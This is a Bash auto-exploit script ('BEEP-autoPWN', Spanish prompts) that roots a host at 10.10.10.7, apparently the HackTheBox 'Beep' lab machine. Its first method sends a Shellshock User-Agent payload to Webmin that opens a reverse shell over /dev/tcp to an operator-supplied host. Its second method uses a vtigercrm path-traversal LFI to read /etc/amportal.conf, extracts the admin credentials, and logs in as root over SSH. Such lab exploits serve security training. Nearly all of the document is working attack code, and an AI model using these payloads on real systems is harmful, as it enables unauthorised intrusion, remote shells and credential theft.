#!/bin/bash

echo " ____  _____ _____ ____                   _        ______        ___   _  "
echo "| __ )| ____| ____|  _ \       __ _ _   _| |_ ___ |  _ \ \      / / \ | | "
echo "|  _ \|  _| |  _| | |_) |____ / _  | | | | __/ _ \| |_) \ \ /\ / /|  \| | "
echo "| |_) | |___| |___|  __/_____| (_| | |_| | || (_) |  __/ \ V  V / | |\  | "
echo "|____/|_____|_____|_|         \__,_|\__,_|\__\___/|_|     \_/\_/  |_| \_| "
echo "                                                                          "
echo "                                               by z3r0byte                "

sleep 2

# wait animation
animation(){
chars="/-\|"

	while :; do
  		for (( i=0; i<${#chars}; i++ )); do
    			sleep 0.5
    			echo -en "${chars:$i:1} Espera" "\r"
  		done
	done
}
# ctrl_c

ctrl_c(){
	echo -e "[!] Saliendo..."
	sleep 1; exit 1
}

trap ctrl_c INT

# Metodo 1


metodoUno(){
	echo -e "\n[+] Has elegido el metodo 1 de rootear la máquina: shellshock\n"

	read -p "[+] Introduce tu LHOST: " lhost

	echo -e "\n"

	read -p "[+] Introduce tu LPORT: " lport

	echo -e "\n"

	read -p "[!] Ponte en escucha por nc y pulsa enter cuando lo hayas hecho" null

	timeout 4 curl --tlsv1.0 --tls-max 1.0 -k -A "() { :; }; /bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1" https://10.10.10.7:10000/session_login.cgi &>/dev/null

	exit 0
}

# Metodo 2

metodoDos(){

	echo -e "\n[+] Has elegido el metodo 2 de rootear la máquina: credentials file disclosure a traves de un LFI \n"

	user=$(curl --tlsv1.0 --tls-max 1.0 -k --insecure --cipher 'DEFAULT:!DH' -s "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -oP "AMPMGRUSER=(.*)" | cut -d'=' -f 2)

	pass=$(curl --tlsv1.0 --tls-max 1.0 -k --insecure --cipher 'DEFAULT:!DH' -s "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" | grep -oP "AMPMGRPASS=(.*)" | cut -d'=' -f 2 | tail -n 1)
	
	echo -e "\n[!] Espera..."

	which sshpass &>/dev/null

	if [ $? -eq 0 ]; then
		sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
	else
		read -p "[+] No se encuentra el paquete 'sshpass', quieres instalarlo? (si/no)" eleccion

		if [ $eleccion == "si" ];then

			sudo apt-get update &>/dev/null && sudo apt-get install sshpass -y &>/dev/null

			sshpass -p "$pass" ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 root@10.10.10.7
		else
			echo -e "\n[!] vale, si no quieres instalar el paquete puedes acceder por ssh con las siguientes credenciales: user=$user pass=$pass"
			exit 0

		fi
	fi
}


# Help panel

helpPanel(){

	echo -e "\n[!] Uso: $0 -m [1-2]\n"
	echo -e "\t[!] Ejemplo: $0 -m 1\n"
}


[ $# -eq 0 ] && helpPanel

while getopts 'm:' arg; do
  case "${arg}" in
    m) parameter=${OPTARG}
       if [ "$parameter" == "1" ]; then
	       metodoUno
	
	elif [ "$parameter" == "2" ]; then
		metodoDos
	else
		helpPanel
	fi
	;;
    *) helpPanel
	;;
  esac
done
